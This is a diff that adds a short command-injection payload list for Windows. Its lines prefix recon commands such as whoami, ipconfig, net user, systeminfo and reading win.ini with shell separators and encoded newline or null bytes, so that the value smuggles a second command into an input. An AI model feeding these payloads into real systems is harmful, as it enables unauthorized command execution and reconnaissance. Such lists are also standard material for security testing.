@@ -1,0 +1,17 @@
+# Command Injection - Windows Payloads
+& whoami
+| whoami
+; whoami
+& ipconfig
+| ipconfig
+& dir
+| dir
+& net user
+& systeminfo
+& type C:\Windows\win.ini
+& dir C:\
+%0awhoami
+%0a%0d whoami
+%00 whoami
+&& whoami
+|| whoami
